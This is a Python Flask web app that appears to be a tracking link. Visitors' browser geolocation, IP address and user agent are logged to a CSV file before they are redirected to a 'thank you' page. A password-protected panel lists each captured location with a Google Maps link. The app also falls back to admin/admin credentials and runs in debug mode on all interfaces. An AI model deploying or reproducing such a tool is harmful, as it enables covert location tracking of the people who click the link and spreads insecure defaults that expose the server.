from flask import Flask, render_template, request, jsonify, Response, url_for
from datetime import datetime
import csv, os, json
from functools import wraps

app = Flask(__name__)

LOG_FILE = "click_logs.csv"
ADMIN_FILE = "admin.json"

# ────────────────────────────────────────────────────────────────
# Helpers
# ────────────────────────────────────────────────────────────────

def load_admin_creds():
    try:
        with open(ADMIN_FILE) as f:
            data = json.load(f)
            return data.get("username"), data.get("password")
    except Exception:
        return "admin", "admin"

def log_click(ip: str, lat: float, lon: float, accuracy: float | None, agent: str, cid: str):
    """Append a row to the CSV. Create header on first write."""
    new_file = not os.path.isfile(LOG_FILE)
    with open(LOG_FILE, "a", newline="") as f:
        writer = csv.writer(f)
        if new_file:
            writer.writerow([
                "timestamp_utc", "client_id", "ip_address", "latitude", "longitude", "accuracy_m", "user_agent"
            ])
        writer.writerow([
            datetime.utcnow().isoformat(timespec="seconds"), cid, ip, lat, lon, accuracy, agent
        ])

# ────────────────────────────────────────────────────────────────
# Auth Decorator
# ────────────────────────────────────────────────────────────────

def check_auth(username, password):
    admin_user, admin_pass = load_admin_creds()
    return username == admin_user and password == admin_pass

def authenticate():
    return Response("Auth required", 401, {"WWW-Authenticate": 'Basic realm="Login Required"'})

def requires_auth(fn):
    @wraps(fn)
    def wrapper(*args, **kwargs):
        auth = request.authorization
        if not auth or not check_auth(auth.username, auth.password):
            return authenticate()
        return fn(*args, **kwargs)
    return wrapper

# ────────────────────────────────────────────────────────────────
# Routes
# ────────────────────────────────────────────────────────────────

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/thankyou")
def thankyou():
    return render_template("redirect.html")

@app.route("/report", methods=["POST"])
def report():
    data = request.get_json(force=True)
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    lat = data.get("latitude")
    lon = data.get("longitude")
    accuracy = data.get("accuracy")
    cid = data.get("cid")  # client‑side UUID
    agent = request.headers.get("User-Agent", "")[:255]

    log_click(ip, lat, lon, accuracy, agent, cid)
    return jsonify({"redirect": url_for("thankyou")})

@app.route("/panel")
@requires_auth
def panel():
    entries = []
    if os.path.isfile(LOG_FILE):
        with open(LOG_FILE, newline="") as f:
            reader = csv.DictReader(f)
            entries = list(reader)
            for row in entries:
                lat, lon = row.get("latitude"), row.get("longitude")
                if lat and lon:
                    row["map_url"] = f"https://www.google.com/maps?q={lat},{lon}"
    return render_template("panel.html", entries=entries, link=url_for("index", _external=True))

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80, debug=True)
